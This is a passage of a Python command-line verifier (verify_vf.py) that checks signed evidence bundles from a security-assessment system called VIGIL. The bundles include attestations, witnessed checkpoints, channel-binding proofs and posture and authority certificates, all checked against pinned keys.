    log: list[str] = []
    results: list[bool] = []

    # --- optional out-of-band fingerprint pins (anchor authenticity before any crypto is trusted) ---
    if trust_root is not None:
        ok, note = _check_pin(trust_root, pin)
        log.append(f"  governance trust-root: {note}")
        if not ok:
            return False, log + ["bundle NOT SOUND (governance trust root not the pinned key)"]
    if witness_trust_root is not None:
        ok, note = _check_pin(witness_trust_root, witness_pin)
        log.append(f"  witness trust-root: {note}")
        if not ok:
            return False, log + ["bundle NOT SOUND (witness trust root not the pinned key)"]

    # --- prove-cert ---
    if "prove_cert" in bundle:
        if not isinstance(signer_pubkeys, dict):
            log.append("  [BAD] prove_cert present but no --signer-pubkeys supplied")
            results.append(False)
        else:
            ok, reason = verify_prove_cert(bundle["prove_cert"], signer_pubkeys=signer_pubkeys)
            log.append(f"  [{'OK ' if ok else 'BAD'}] prove_cert "
                       f"({bundle['prove_cert'].get('state', '?')}): {reason}")
            results.append(ok)

    # --- attestation series ---
    if "attestation" in bundle:
        att = bundle["attestation"] or {}
        if not isinstance(signer_pubkeys, dict) or not isinstance(trust_root, dict):
            log.append("  [BAD] attestation present but --signer-pubkeys and/or --trust-root missing")
            results.append(False)
        else:
            ok, reason, series = verify_attestation_series(
                att.get("ticks") or [], att.get("head"), att.get("floor"),
                trust_root=trust_root, signer_pubkeys=signer_pubkeys)
            log.append(f"  [{'OK ' if ok else 'BAD'}] attestation series: {reason}")
            if ok:
                log.append("     drift: " + " -> ".join(f"{s['state']}({s['label']})" for s in series))
            results.append(ok)

    # --- witnessed timed checkpoint ---
    if "witnessed" in bundle:
        wt = bundle["witnessed"] or {}
        if not isinstance(witness_trust_root, dict):
            log.append("  [BAD] witnessed present but no --witness-trust-root supplied")
            results.append(False)
        else:
            anchor = wt.get("external_time_anchor")
            if anchor is not None and not tsa_cert_pin:
                log.append("     (external_time_anchor present but no --tsa-cert-pin supplied — the "
                           "stronger anchored bound is NOT checked; the median bound below stands)")
            ok, T, reason = verify_timed_witnessed(
                wt.get("checkpoint") or {}, wt.get("witness_signatures") or [],
                witness_trust_root=witness_trust_root, min_distinct_signers=min_distinct_signers,
                external_time_anchor=anchor if tsa_cert_pin else None, tsa_cert_pin=tsa_cert_pin)
            log.append(f"  [{'OK ' if ok else 'BAD'}] witnessed checkpoint "
                       f"(no-later-than T={T}): {reason}")
            results.append(ok)

    # --- Z1 channel-binding (zkTLS notary co-sign) ---
    if "channel_binding" in bundle:
        if not notary_pin:
            log.append("  [BAD] channel_binding present but no --notary-pin supplied")
            results.append(False)
        else:
            ok, reason = verify_channel_binding_evidence(
                bundle["channel_binding"] or {}, notary_public_key_pin_b64=notary_pin)
            log.append(f"  [{'OK ' if ok else 'BAD'}] channel_binding: {reason}")
            results.append(ok)

    # --- PostureCertificate (Certificate of Non-Exploitability) ---
    if "posture" in bundle:
        if not posture_pin:
            log.append("  [BAD] posture present but no --posture-fingerprint (out-of-band) — fail-closed")
            results.append(False)
        elif not posture_owner_pubkey or not posture_engagement or posture_now is None:
            log.append("  [BAD] posture present but --posture-owner-pubkey / --posture-engagement / "
                       "--posture-now missing (needed to bind the certificate to its target)")
            results.append(False)
        else:
            ok, reason = verify_posture(bundle["posture"] or {}, pin=posture_pin,
                                        owner_pubkey=posture_owner_pubkey, engagement=posture_engagement,
                                        now=int(posture_now))
            log.append(f"  [{'OK ' if ok else 'BAD'}] posture: {reason}")
            results.append(ok)

    # --- Authority-Envelope certificate (the accountability twin) ---
    if "authority" in bundle:
        if not authority_pin:
            log.append("  [BAD] authority present but no --authority-fingerprint (out-of-band) — fail-closed")
            results.append(False)
        elif not authority_owner_pubkey or not authority_engagement:
            log.append("  [BAD] authority present but --authority-owner-pubkey / --authority-engagement missing")
            results.append(False)
        else:
            ok, reason = verify_authority(bundle["authority"] or {}, pin=authority_pin,
                                          owner_pubkey=authority_owner_pubkey, engagement=authority_engagement)
            log.append(f"  [{'OK ' if ok else 'BAD'}] authority: {reason}")
            results.append(ok)

    sound = bool(results) and all(results)
    log.append(f"bundle {'SOUND' if sound else 'NOT SOUND'} "
               f"(standalone: signatures + binding + structure + chain + quorum; "
               f"oracle silence/fire needs the VIGIL verifier)")
    return sound, log


def _load_json(path: str) -> Any:
    return json.loads(Path(path).read_text(encoding="utf-8"))


def _cmd_verify(args: argparse.Namespace) -> int:
    if args.prove_standalone:
        _assert_vigil_free()
    try:
        bundle = _load_json(args.bundle)
        signer_pubkeys = _load_json(args.signer_pubkeys) if args.signer_pubkeys else None
        trust_root = _load_json(args.trust_root) if args.trust_root else None
        witness_trust_root = _load_json(args.witness_trust_root) if args.witness_trust_root else None
    except (OSError, json.JSONDecodeError) as e:
        print(f"[ERROR] {type(e).__name__}: {e}", file=sys.stderr)
        return 3
    _known = {"prove_cert", "attestation", "witnessed", "channel_binding", "posture", "authority"}
    if not isinstance(bundle, dict) or not (_known & set(bundle)):
        print("[ERROR] bundle has none of prove_cert / attestation / witnessed / channel_binding / "
              "posture / authority", file=sys.stderr)
        return 3
    sound, log = verify_bundle(
        bundle, signer_pubkeys=signer_pubkeys, trust_root=trust_root,
        witness_trust_root=witness_trust_root, pin=args.fingerprint, witness_pin=args.witness_fingerprint,
        min_distinct_signers=args.min_distinct_signers, tsa_cert_pin=args.tsa_cert_pin,
        notary_pin=args.notary_pin,
        posture_pin=getattr(args, "posture_fingerprint", "") or "",
        posture_owner_pubkey=getattr(args, "posture_owner_pubkey", "") or "",
        posture_engagement=getattr(args, "posture_engagement", "") or "",
        posture_now=getattr(args, "posture_now", None),
        authority_pin=getattr(args, "authority_fingerprint", "") or "",
        authority_owner_pubkey=getattr(args, "authority_owner_pubkey", "") or "",
        authority_engagement=getattr(args, "authority_engagement", "") or "")
    for line in log:
        print(line)
    return 0 if sound else 2


def _cmd_reexec_general(args: argparse.Namespace) -> int:
    """Re-derive a general FACT's verdict from its retained ``oracle_context`` (Step 2, the pure
    oracle families) with ZERO VIGIL code. Prints the re-fired signals + the combined verdict, and
    names any IRREDUCIBLE oracle key present (whose re-verification needs an in-VIGIL re-run)."""
    if args.prove_standalone:
        _assert_vigil_free()
    try:
        oc = _load_json(args.context)
    except (OSError, json.JSONDecodeError) as e:
        print(f"[ERROR] {type(e).__name__}: {e}", file=sys.stderr)
        return 3
    # Accept either a bare oracle_context, or a {oracle_context: {...}} / PCF {value: {...}} wrapper.
    if isinstance(oc, dict) and "oracle_context" in oc and isinstance(oc["oracle_context"], dict):
        oc = oc["oracle_context"]
    if isinstance(oc, dict) and set(oc) <= {"digest", "value"} and isinstance(oc.get("value"), dict):
        oc = oc["value"]
    res = reexecute_general_oracle(oc)
    if not res["reproduced"]:
        print("NOT REPRODUCED — the oracle_context carries no PORTED (pure, stdlib) general oracle key"
              + (f"; IRREDUCIBLE keys present: {res['unported_keys']}" if res["unported_keys"] else ""))
        return 2
    for s in res["signals"]:
        print(f"  oracle {s['kind']}: fired={s['fired']} conclusive={s['conclusive']} "
              f"confidence={s['confidence']:.3f}")
    if res["unported_keys"]:
        print(f"  NOTE: IRREDUCIBLE oracle key(s) also present (re-verify needs an in-VIGIL re-run, "
              f"NOT reproduced here): {res['unported_keys']}")
    verdict = "FIRED (re-derived positive)" if res["fired"] else "no high-confidence fire (re-derived)"
    print(f"RE-DERIVED: {verdict} — the verdict is the correct function of the RETAINED evidence "
          f"(producer-supplied; a live re-run is still required to prove it reflects the live target)")
    return 0 if res["fired"] else 2


def main(argv: list) -> int:
    p = argparse.ArgumentParser(
        prog="verify_vf.py",
        description="Standalone verifier for the VIGIL Verifiable-Fact remediation lifecycle "
                    "(stdlib + Ed25519 only; imports no VIGIL code).")
    sub = p.add_subparsers(dest="cmd", required=True)
    v = sub.add_parser("verify", help="verify a VF bundle {prove_cert | attestation | witnessed}")
    v.add_argument("--bundle", required=True, help="the VF bundle JSON")
    v.add_argument("--signer-pubkeys", default="", dest="signer_pubkeys",
                   help="{key_id: pubkey_b64} — pinned prove-cert + tick admission keys")
    v.add_argument("--trust-root", default="", dest="trust_root",
                   help="governance TrustRoot JSON (for the attestation head signature)")
    v.add_argument("--witness-trust-root", default="", dest="witness_trust_root",
                   help="witness TrustRoot JSON (for the timed witnessed checkpoint)")
    v.add_argument("--fingerprint", default="", help="out-of-band pin on --trust-root (sha256:… or hex)")
    v.add_argument("--witness-fingerprint", default="", dest="witness_fingerprint",
                   help="out-of-band pin on --witness-trust-root (sha256:… or hex)")
    v.add_argument("--min-distinct-signers", type=int, default=None, dest="min_distinct_signers",
                   help="require at least N distinct verifying witnesses (blunts producer curation)")
    v.add_argument("--tsa-cert-pin", default=None, dest="tsa_cert_pin",
                   help="path to the PINNED TSA cert (PEM) for the A1 RFC3161 external time anchor over the "
                        "witnessed checkpoint; when supplied and the bundle carries external_time_anchor, "
                        "its genTime supersedes the quorum-median bound (openssl ts, VIGIL-free)")
    v.add_argument("--notary-pin", default="", dest="notary_pin",
                   help="out-of-band PINNED notary Ed25519 public key (base64) for a Z1 channel_binding "
                        "bundle; the co-signature is trusted ONLY when it is from this key (zkTLS mechanism — "
                        "a software notary is not producer-unforgeable, see Z1 residual)")
    v.add_argument("--prove-standalone", action="store_true",
                   help="first assert no VIGIL module is imported or importable, else exit non-zero")
    # --- PostureCertificate (Certificate of Non-Exploitability) ---
    v.add_argument("--posture-fingerprint", default="", dest="posture_fingerprint",
                   help="REQUIRED for a `posture` bundle: the out-of-band pin on the posture certificate's "
                        "authorizer set (sha256:… ) — fail-closed without it")
    v.add_argument("--posture-owner-pubkey", default="", dest="posture_owner_pubkey",
                   help="the target-owner's Ed25519 public key (base64) that signed the certificate's "
                        "IdentityAttestation — binds the posture proof to its target")
    v.add_argument("--posture-engagement", default="", dest="posture_engagement",
                   help="the engagement the IdentityAttestation must be for")
    v.add_argument("--posture-now", type=int, default=None, dest="posture_now",
                   help="the epoch time to check the IdentityAttestation's not_after against")
    # --- Authority-Envelope certificate (the accountability twin) ---
    v.add_argument("--authority-fingerprint", default="", dest="authority_fingerprint",
                   help="REQUIRED for an `authority` bundle: the out-of-band pin on the certificate's "
                        "authorizer set (fail-closed without it)")
    v.add_argument("--authority-owner-pubkey", default="", dest="authority_owner_pubkey",
                   help="the owner's Ed25519 public key (base64) that signed the authority envelope")
    v.add_argument("--authority-engagement", default="", dest="authority_engagement",
                   help="the engagement the authority envelope must be for")
    v.set_defaults(fn=_cmd_verify)

    rg = sub.add_parser("reexec-general",
                        help="re-derive a general FACT's verdict from its retained oracle_context "
                             "(Step 2, the PURE stdlib oracle families) — VIGIL-free")
    rg.add_argument("--context", required=True,
                    help="the retained oracle_context JSON (bare, or a {oracle_context|value: {...}} wrapper)")
    rg.add_argument("--prove-standalone", action="store_true",
                    help="first assert no VIGIL module is imported or importable, else exit non-zero")
    rg.set_defaults(fn=_cmd_reexec_general)

    args = p.parse_args(argv)
    return args.fn(args)


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
